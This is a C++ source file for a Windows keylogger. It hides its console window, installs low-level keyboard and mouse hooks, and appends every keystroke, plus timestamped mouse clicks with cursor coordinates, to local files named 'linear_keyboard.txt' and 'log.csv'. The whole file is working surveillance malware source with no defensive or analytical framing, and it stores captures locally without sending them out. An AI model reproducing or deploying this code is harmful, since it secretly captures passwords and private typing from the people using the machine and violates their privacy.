#include <iostream>
#include <Windows.h>
#include <fstream>
#include <sstream>
#include <chrono>
#include <iomanip>
#include <locale>




std::ofstream logFile, keyboardFile;
std::ostringstream logStream, keyboardStream;

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    logFile.open("log.csv", std::ios::app);
    logStream << "Time,Event,Type,Key/Position\n";
    logFile << logStream.str();
    logFile.close();

    keyboardFile.open("linear_keyboard.txt", std::ios::app);
    keyboardFile << "Every word typed by computer: \n";
    keyboardFile.close();

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, NULL, 0);

    MSG message;
    std::cout << "I am working now\nBut you don't need to look at terminal for real";
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
    return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        auto time_now = std::chrono::system_clock::now();
        auto timestamp = std::chrono::system_clock::to_time_t(time_now);
        std::string key;

        if (p->vkCode == VK_RETURN)
        {
            key = " (typed Enter) ";
            std::tm timeinfo;
            localtime_s(&timeinfo, &timestamp);
            if (timeinfo.tm_sec % 30 == 0) {
                keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":"
                    << key;
            }
            else {
                keyboardStream << key << "\n";
            }
        }
        else
        {
            key = static_cast<char>(tolower(p->vkCode));
            std::tm timeinfo;
            localtime_s(&timeinfo, &timestamp);
            if (timeinfo.tm_sec % 30 == 0) {
                keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":"
                    << key;
            }
            else {
                keyboardStream << key;
            }
        }
        std::tm timeinfo;
        localtime_s(&timeinfo, &timestamp);
        logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ","
            << "Key,Pressed,"
            << key << "\n";
        logFile.open("log.csv", std::ios::app);
        logFile << logStream.str();
        logFile.close();
        logStream.str("");
        localtime_s(&timeinfo, &timestamp);
        keyboardFile.open("linear_keyboard.txt", std::ios::app);
        keyboardFile << keyboardStream.str();
        keyboardFile.close();
        keyboardStream.str("");
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
    {
        ULONGLONG time_now = GetTickCount64();
        POINT p;
        GetCursorPos(&p);
        std::string button;
        switch (wParam)
        {
        case WM_LBUTTONDOWN:
            button = "Left";
            break;
        case WM_RBUTTONDOWN:
            button = "Right";
            break;
        case WM_MBUTTONDOWN:
            button = "Middle";
            break;
        default:
            button = "Unknown";
            break;
        }
        time_t timestamp = time(nullptr);
        struct tm localtime_buffer;
        localtime_s(&localtime_buffer, &timestamp);
        char time_str[20];
        strftime(time_str, 20, "%Y-%m-%d %H:%M:%S", &localtime_buffer);
        logStream << time_str << "," << time_now << ",Mouse," << button << "," << p.x << "," << p.y << "\n";
        logFile.open("log.csv", std::ios::app);
        logFile << logStream.str();
        logFile.close();
        logStream.str("");
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
